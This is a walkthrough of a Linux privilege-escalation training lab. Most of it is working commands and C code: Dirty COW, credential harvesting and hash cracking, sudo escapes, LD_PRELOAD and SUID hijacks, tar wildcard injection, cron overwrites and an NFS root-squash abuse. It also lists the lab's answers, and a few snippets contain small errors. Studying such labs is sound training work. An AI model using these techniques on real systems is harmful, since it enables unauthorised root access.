# Linux PreviEsc Arena

#### Reference

{% embed url="https://github.com/sagishahar/lpeworkshop" %}

## Task 3 Kernel Exploits

```bash
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
# [+] [CVE-2016-5195] dirtycow
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd
id
# uid=0(root) gid=1000(user) groups=0(root)
```

## Task 4 Stored Password (Config Files)

```bash
cat /home/user/myvpn.ovpn | sed -n 12p
# auth-user-pass /etc/openvpn/auth.txt
cat /etc/openvpn/auth.txt
# user
# password321
cat /home/user/.irssi/config | grep -i -C 4 passw
# chatnets = {
#   Freenode = {
#     type = "IRC";
#     nick = "user";
#     autosendcmd = "/msg nickserv identify password321 ;wait 2000";
#   };
# };
```

#### What password did you find?

{% hint style="success" %}
`password321`
{% endhint %}

#### What user's credentials were exposed in the OpenVPN auth file?

{% hint style="success" %}
user
{% endhint %}

## Task 5 Stored Passwords (History)

```bash
cat ~/.bash_history | grep -i passw
# mysql -h somehost.local -uroot -ppassword123
```

#### What was TCM trying to log into?

{% hint style="success" %}
`mysql`
{% endhint %}

#### Who was TCM trying to log in as?

{% hint style="success" %}
root
{% endhint %}

#### Naughty naughty. What was the password discovered?

{% hint style="success" %}
`password123`
{% endhint %}

## Task 6 Weak File Permissions

```bash
ls -l /etc/shadow
# -rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
```

```bash
scp TCM@10.10.24.41:/etc/{passwd,shadow} .
unshadow passwd shadow > unshadow.txt
hashcat -a 0 -m 1800 unshadow.txt /usr/share/wordlists/rockyou.txt
# root:password123
```

#### What were the file permissions on the /etc/shadow file?

{% hint style="success" %}
`-rw-rw-r--`
{% endhint %}

## Task 7 SSH Keys

```bash
find / -type f -name authorized_keys 2>/dev/null
find / -type f -name id_rsa  2>/dev/null
# /backups/supersecretkeys/id_rsa
```

```bash
scp TCM@10.10.24.41:/backups/supersecretkeys/id_rsa . 
chmod 400 id_rsa
ssh -i id_rsa root@10.10.24.41
```

#### What's the full file path of the sensitive file you discovered?

{% hint style="success" %}
`/backups/supersecretkeys/id_rsa`
{% endhint %}

## Task 8 Sudo (Shell Escaping)

```bash
sudo -l
# User TCM may run the following commands on this host:
#     (root) NOPASSWD: /usr/sbin/iftop
#     (root) NOPASSWD: /usr/bin/find
#     (root) NOPASSWD: /usr/bin/nano
#     (root) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /usr/bin/man
#     (root) NOPASSWD: /usr/bin/awk
#     (root) NOPASSWD: /usr/bin/less
#     (root) NOPASSWD: /usr/bin/ftp
#     (root) NOPASSWD: /usr/bin/nmap
#     (root) NOPASSWD: /usr/sbin/apache2
#     (root) NOPASSWD: /bin/more
sudo find /bin -type f -name nano -exec /bin/sh \;
sudo awk 'BEGIN{system("/bin/sh")}'
echo 'os.execute("/bin/sh")' > shell.nse && sudo nmap --script=shell.nse
sudo vim -c '!sh'
```

## Task 9 Sudo (Abusing Intented Functionality)

```bash
sudo -l
sudo apache2 -f /etc/shadow
# Invalid Command 'root:...'
```

```bash
echo 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::' > shadow.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/nmap.lst shadow.txt
```

## Task 10 Sudo (LD\_PRELOAD)

```bash
sudo -l
```

```bash
vim x.c
# #include <stdlib.h>
# #include <unistd.h>

# void _init() {
#     unsetenv("LD_PRELOAD");
#     setgid(0);
#     setuid(0);
#     system("/bin/sh");
# }
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```

## Task 11 SUID (Shared Object Injection)

```bash
find / -type f -perm -4000 2>/dev/null
# /usr/local/bin/suid-so
# /usr/local/bin/suid-env
# /usr/local/bin/suid-env2
strace suid-so 2>&1 | egrep -i '(open|access|no such file)'
# open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

```bash
mkdir /home/user/.config
cd /home/user/.config/
vim libcalc.c
# #include <stdlib.h>

# static void inject() __attribute__((constructor));

# void inject() {
#     system("cp /bin/bash /tmp/ && chmod +s /tmp/bash && /tmp/bash -p");
# }
gcc -fPIC -shared -o libcalc.so libcalc.c
suid-so
```

## Task 12 SUID (Symlinks)

```bash
dpkg -l | grep nginx
# ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
# ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
su - root
su - www-data
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```

```
su - root
invoke-rc.d nginx rotate >/dev/null 2&1
```

#### What CVE is being exploited in this task?

![](<.gitbook/assets/Screenshot from 2021-09-10 09-32-45.png>)

{% hint style="success" %}
`CVE-2016-1247`
{% endhint %}

#### What binary is SUID enabled and assists in the attack?

![](<.gitbook/assets/Screenshot from 2021-09-10 09-31-54.png>)

{% hint style="success" %}
`sudo`
{% endhint %}

#### Reference

{% embed url="http://sp4rk.win/2017/03/01/Nginx%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(cve-2016-1247)%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" %}

## Task 13 SUID (Environment Variables #1)

```bash
find / -type f -perm -4000 2>/dev/null
# /usr/local/bin/suid-env
strings /usr/local/bin/suid-env
# system
# service apache2 start
```

```bash
echo 'int main {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
gcc -o /tmp/service /tmp/service.c
PATH=/tmp:$PATH suid-env
```

#### What is the last line of the "strings /usr/local/bin/suid-env" output?

{% hint style="success" %}
`service apache2 start`
{% endhint %}

## Task 14 SUID (Environment Variables #2)

```bash
find / -type f -perm -4000 2>/dev/null
# /usr/local/bin/suid-env2
strings /usr/local/bin/suid-env2
# system
# /usr/sbin/service apache2 start
```

{% tabs %}
{% tab title="Method #1" %}
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
suid-env2
```
{% endtab %}

{% tab title="Method #2" %}
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chmod +s /tmp/bash)' /bin/sh -c 'suid-env2; set +x; /tmp/bash -p'
```
{% endtab %}
{% endtabs %}

#### What is the last line of the "strings /usr/local/bin/suid-env2" output?

{% hint style="success" %}
`/usr/sbin/service apache2 start`
{% endhint %}

## Task 15 Capabilities

```bash
getcap -r / 2>/dev/null
# /usr/bin/python2.6 = cap_setuid+ep
python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Task 16 Cron (Path)

```bash
cat /etc/crontab 
# * * * * * root overwrite.sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
/tmp/bash -p
```

## Task 17 Cron (Wildcards)

```bash
cat /etc/crontab 
# * * * * * root /usr/local/bin/compress.sh
cat /usr/local/bin/compress.sh 
# #!/bin/sh
# cd /home/user
# tar czf /tmp/backup.tar.gz *
```

```
echo 'cp /bin/bash /tmp/bash2; chmod +s /tmp/bash2' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
/tmp/bash2 -p
```

#### Reference

{% embed url="https://blog.csdn.net/qq_33958714/article/details/111084322" %}

## Task 18 Cron (File Overwrite)

```bash
cat /etc/crontab 
# * * * * * root overwrite.sh
ls -l /usr/local/bin/overwrite.sh
# -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
echo 'cp /bin/bash /tmp/bash3; chmod +s /tmp/bash3' > /usr/local/bin/overwrite.sh
/tmp/bash3 -p
```

## Task 19 NFS Root Squashing

```bash
cat /etc/exports
# /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

```bash
showmount -e 10.10.24.41                                                                                                         130 ⨯
# /tmp *
mkdir /tmp/1
sudo mount -o rw,vers=2 10.10.24.41:/tmp /tmp/1
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/1/x.c
gcc -o /tmp/1/x /tmp/1/x.c
sudo chown root:root /tmp/1/x
sudo chmod +s /tmp/1/x
```

```
/tmp/x
```
